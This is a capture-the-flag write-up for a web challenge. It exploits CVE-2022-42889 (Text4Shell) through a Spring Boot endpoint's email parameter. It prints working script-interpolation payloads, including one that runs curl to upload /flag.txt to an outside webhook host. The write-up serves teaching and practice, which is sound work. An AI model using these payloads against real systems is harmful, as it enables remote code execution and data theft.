# Subscribe For More

`#Web`



## Solution

` Recon Part`

The goal was to get the flag from the server. The challenge was given with a source file, open the pom.xml file and if you were familiar with recent CVE's then you've noticed that a libary called `commons-text` were there . </br>



![alt text](https://i.imgur.com/LyQmihs.png)


Then lets google the libary for vulnerability.


![alt text](https://i.imgur.com/vjbusG0.png)
![alt text](https://i.imgur.com/ge5MUY3.png)

so we got our CVE no and name the only part left is to go to github and search for public exploit code or payloads.

Then we move to main applicaion code which is in `src > main > java > com > example > sprigboot > Textcontroller.java`

![alt text](https://i.imgur.com/1AGNNJN.png)

if we look close we will find an endpoint /api/subscribe and takes an input with paramitter name email

now we have our CVE and one endpoint which we can send our user controlled data which is our payload

## 

` Exploitation Part`


so now that we have our targeted endpint and cve goto burp and capture the request `https://target.com/api/subscribe?email=blabla` , we can see the it returned with a 200 response containig  ``{"message": "your email has been subscribed"}``

which tells us that our endpoint is working fine now time to attack 

get a payload of CVE-2022-42889 AKA Text4Shell , I took `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')}` this one with creating a pwned file in /tmp directory 

fire and see . no response now what we can do is simply chec if command is working or not . for this we can curl a webhook site.

![alt text](https://i.imgur.com/HwcQ8JW.png)

![alt text](https://i.imgur.com/6qjfgaq.png)

we can see it's working , a requst from the server.. and form the file structre of the zip there is a flag file root of the directory .. now wee only need to get the flag through the curl .

for that we'll send a PUT request to webhook url. 


so the final payload should look like this with url-encode:

```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27curl%20-T%20%2fflag.txt%20https%3a%2f%2fwebhook.site%27)%7D
```

after sending the request we'll gonna be loking into webhook site we'll see a put request containing our flag.


![alt text](https://i.imgur.com/nvyH32Q.png)



That's it..
